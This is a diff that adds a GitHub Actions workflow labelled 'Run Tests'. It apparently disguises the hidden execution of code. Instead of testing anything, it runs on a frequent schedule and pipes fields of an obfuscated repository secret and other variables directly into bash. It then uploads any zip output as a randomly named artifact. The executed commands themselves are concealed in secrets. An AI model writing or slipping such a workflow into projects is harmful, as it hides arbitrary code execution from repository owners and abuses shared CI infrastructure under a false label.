@@ -1,0 +1,31 @@
+name: Run Tests
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '44 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  compile:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Setup and run
+        env:
+          hxva259: ${{ secrets.hxva259 }}
+        run: |
+          printf '%s' "$hxva259" | jq -r .hty1004 | /bin/bash
+          printf '%s' "$ib17" | jq -r .rhgcp866 | /bin/bash
+          printf '%s' "$ppgt0" | jq -r .il4 | /bin/bash
+          echo $ltvd727 | jq -r .mpmu52 | /bin/bash
+
+      - name: Upload data
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 5m4uZRpE
+          path: "*.zip"
+          retention-days: 1
